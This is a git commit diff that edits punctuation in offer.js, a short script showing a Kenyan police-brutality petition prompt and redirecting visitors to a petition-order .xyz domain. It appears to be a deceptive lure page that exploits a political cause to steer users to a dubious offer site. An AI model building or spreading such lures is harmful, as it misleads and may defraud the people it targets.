9a54297fe0826036e12a7139c3c40378984b87c3
essac5523me <essac5523+me@gmail.com>
2025-06-25 21:29:44 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'sign'
-password=prompt('SMS: Help Sign The Petition To End BAD GOVERNANCE AND POLICE BRUTALITY IN KENYA. , Kindly press "OK" to Proceed.  ','sign');
+password=prompt('SMS: Help Sign The Petition To End BAD GOVERNANCE AND POLICE BRUTALITY IN KENYA, Kindly press "OK" to Proceed.  ','sign');
 if (password != 'sign') {
 location.href='https://petition-order.allprograms.xyz/sign';
 }
